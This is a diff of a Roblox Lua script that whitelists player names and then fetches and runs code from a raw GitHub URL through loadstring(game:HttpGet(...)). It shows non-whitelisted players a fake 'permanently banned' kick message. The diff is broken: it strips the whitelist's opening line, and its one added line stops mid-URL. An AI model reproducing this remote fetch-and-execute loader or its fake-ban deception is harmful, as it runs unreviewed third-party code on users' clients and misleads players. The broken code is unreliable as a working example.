@@ -1,4 +1,3 @@
-local whitelist = {
     "prime_papaya5",
     "midas123456z",
     "Dontaskidkman",
@@ -46,26 +45,4 @@ end
 
 -- Execute a specific script from a URL if the player is whitelisted
 local function executeSpecificScript()
-    local scriptUrl = "https://raw.githubusercontent.com/Saxxgooder/Saxx.lolskiddersnosrc/main/Saxx.loldonttrymenosrcRizzerlol"
-    local success, result = pcall(function()
-        return loadstring(game:HttpGet(scriptUrl, true))()
-    end)
-
-    if not success then
-        local fakeban = "You have been permanently banned."
-        game.Players.LocalPlayer:Kick(fakeban)
-    end
-end
-
--- Kick non-whitelisted players with a customized message
-local function kickNonWhitelistedPlayer()
-    local message = "You are not whitelisted. Access denied."
-    game.Players.LocalPlayer:Kick(message)
-end
-
--- Main logic
-if isPlayerWhitelisted(player.Name) then
-    executeSpecificScript()
-else
-    kickNonWhitelistedPlayer()
-end
+    local scriptUrl = "https://raw.githubusercontent.com/Saxxgooder/Saxx.lolskiddersnosr
